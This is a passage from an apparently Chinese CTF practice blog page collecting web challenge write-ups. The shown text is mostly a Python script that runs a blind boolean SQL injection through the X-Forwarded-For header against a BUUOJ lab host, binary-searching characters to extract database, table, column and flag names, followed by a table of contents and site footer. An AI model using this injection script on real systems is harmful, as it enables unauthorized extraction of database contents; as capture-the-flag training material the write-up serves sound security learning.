class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&quot;http://node4.buuoj.cn:27074/&quot;</span></span><br><span class="line"></span><br><span class="line">head=&#123;</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;111&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;111&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125; </span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;too fast&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid </span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(mid),res)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p></p><div class="tags"><a href="/tags/WEB/" rel="tag"><i class="ic i-tag"></i> WEB</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-12-13 10:19:14" itemprop="dateModified" datetime="2023-12-13T10:19:14+08:00">2023-12-13</time> </span><span id="WEB刷题-md/" class="item leancloud_visitors" data-flag-title="WEB刷题解析" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="c0iq 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="c0iq 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>c0iq <i class="ic i-at"><em>@</em></i>ililiiY</li><li class="link"><strong>本文链接：</strong> <a href="https://lookhui.github.io/WEB%E5%88%B7%E9%A2%98-md/" title="WEB刷题解析">https://lookhui.github.io/WEB刷题-md/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"></div><div class="item right"><a href="/PWN%E5%88%B7%E9%A2%98-md/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?104980" title="PWN刷题解析"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> PWN</span><h3>PWN刷题解析</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#hznuctf-2023-preliminaryppppop"><span class="toc-number">1.</span> <span class="toc-text">[HZNUCTF 2023 preliminary]ppppop</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hznuctf-2023-preliminaryguessguessguess"><span class="toc-number">2.</span> <span class="toc-text">[HZNUCTF 2023 preliminary]guessguessguess</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fsctf-2023webshell%E6%98%AF%E5%95%A5%E6%8D%8F"><span class="toc-number">3.</span> <span class="toc-text">[FSCTF 2023] webshell 是啥捏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2021-finalpenetratable"><span class="toc-number">4.</span> <span class="toc-text">[湖湘杯 2021 final] Penetratable</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nssround13-basicflaskjwt"><span class="toc-number">5.</span> <span class="toc-text">[NSSRound#13 Basic]flask?jwt?</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fsctf-2023%E7%BB%86%E7%8B%9720"><span class="toc-number">6.</span> <span class="toc-text">[FSCTF 2023] 细狗 2.0</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#moectf-2021do-you-know-http"><span class="toc-number">7.</span> <span class="toc-text">[MoeCTF 2021]Do you know HTTP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nssctf-2022-spring-recruitbabysql"><span class="toc-number">8.</span> <span class="toc-text">[NSSCTF 2022 Spring Recruit]babysql</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020blackcat"><span class="toc-number">9.</span> <span class="toc-text">[羊城杯 2020] Blackcat</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hubuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bezsql"><span class="toc-number">10.</span> <span class="toc-text">[HUBUCTF 2022 新生赛] ezsql</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hnctf-2022-week2easy_unser"><span class="toc-number">11.</span> <span class="toc-text">[HNCTF 2022 WEEK2]easy_unser</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sctf-2021loginme"><span class="toc-number">12.</span> <span class="toc-text">[SCTF 2021]loginme</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fsctf-2023ez_eval"><span class="toc-number">13.</span> <span class="toc-text">[FSCTF 2023]EZ_eval</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#csawqual-2019unagi"><span class="toc-number">14.</span> <span class="toc-text">[CSAWQual 2019]Unagi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nssctf-2ndphp%E7%AD%BE%E5%88%B0"><span class="toc-number">15.</span> <span class="toc-text">[NSSCTF 2nd] php 签到</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#october-2019twice-sql-injection"><span class="toc-number">16.</span> <span class="toc-text">[October 2019]Twice SQL Injection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ezhttp"><span class="toc-number">17.</span> <span class="toc-text">EzHttp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#n00b_upload"><span class="toc-number">18.</span> <span class="toc-text">n00b_Upload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#easy_php"><span class="toc-number">19.</span> <span class="toc-text">easy_php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-%E5%9B%A2%E9%98%9F%E7%BB%84love_pokemon"><span class="toc-number">20.</span> <span class="toc-text">[广东强网杯 2021 团队组] love_Pokemon</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#uuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bezsql"><span class="toc-number">21.</span> <span class="toc-text">[UUCTF 2022 新生赛] ezsql</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fsctf-2023ez_php1"><span class="toc-number">22.</span> <span class="toc-text">[FSCTF 2023]ez_php1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Bif_else"><span class="toc-number">23.</span> <span class="toc-text">[SWPUCTF 2023 秋季新生赛] If_else</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fsctf-2023%E5%B7%B4%E5%B7%B4%E6%89%98%E6%96%AF"><span class="toc-number">24.</span> <span class="toc-text">[FSCTF 2023] 巴巴托斯！</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#swpu-2018simplephp"><span class="toc-number">25.</span> <span class="toc-text">[SWPU 2018]SimplePHP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019easy_web"><span class="toc-number">26.</span> <span class="toc-text">[安洵杯 2019] easy_web</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nctf-2018easy_audit"><span class="toc-number">27.</span> <span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hnctf-2022-week1challenge__rce"><span class="toc-number">28.</span> <span class="toc-text">[HNCTF 2022 Week1]Challenge__rce</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#wustctf-2020%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">29.</span> <span class="toc-text">[WUSTCTF 2020] 颜值成绩查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Brce-plus"><span class="toc-number">30.</span> <span class="toc-text">[SWPUCTF 2023 秋季新生赛] RCE-PLUS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B%E4%B8%80%E9%94%AE%E8%BF%9E%E6%8E%A5"><span class="toc-number">31.</span> <span class="toc-text">[SWPUCTF 2023 秋季新生赛] 一键连接！</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018easy_tornado"><span class="toc-number">32.</span> <span class="toc-text">[护网杯 2018] easy_tornado</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hnctf-2022-week2easy_sql"><span class="toc-number">33.</span> <span class="toc-text">[HNCTF 2022 WEEK2]easy_sql</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#roarctf-2019online-proxy"><span class="toc-number">34.</span> <span class="toc-text">[RoarCTF 2019]Online Proxy</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/WEB%E5%88%B7%E9%A2%98-md/" rel="bookmark" title="WEB刷题解析">WEB刷题解析</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="c0iq" data-src="/images/avatar.jpg"><p class="name" itemprop="name">c0iq</p><div class="description" itemprop="description">坚持与努力</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">28</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">7</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">9</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvb2todWk=" title="https:&#x2F;&#x2F;github.com&#x2F;lookhui"><i class="ic i-github"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a></li></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/PWN/" title="分类于 PWN">PWN</a></div><span><a href="/PWN%E5%88%B7%E9%A2%98-md/" title="PWN刷题解析">PWN刷题解析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-TwoDots-Horror/" title="HTB-TwoDots_Horror">HTB-TwoDots_Horror</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-CozyHosting/" title="HTB-CozyHosting">HTB-CozyHosting</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF%E5%88%B7%E9%A2%98/" title="分类于 CTF刷题">CTF刷题</a></div><span><a href="/MOBILE%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="MOBILE刷题记录">MOBILE刷题记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Restauran/" title="HTB-Restauran">HTB-Restauran</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-hunting-md/" title="HTB-hunting">HTB-hunting</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Keeper/" title="HTB-Keeper">HTB-Keeper</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/%E5%B0%8F%E5%B7%A5%E5%85%B7/" title="小工具">小工具</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Zipping/" title="HTB-Zipping">HTB-Zipping</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Devvortex/" title="HTB-Devvortex">HTB-Devvortex</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2025</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">c0iq @ look-hui</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">246k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">3:44</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"WEB刷题-md/",favicon:{show:"looklook",hide:"illi"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->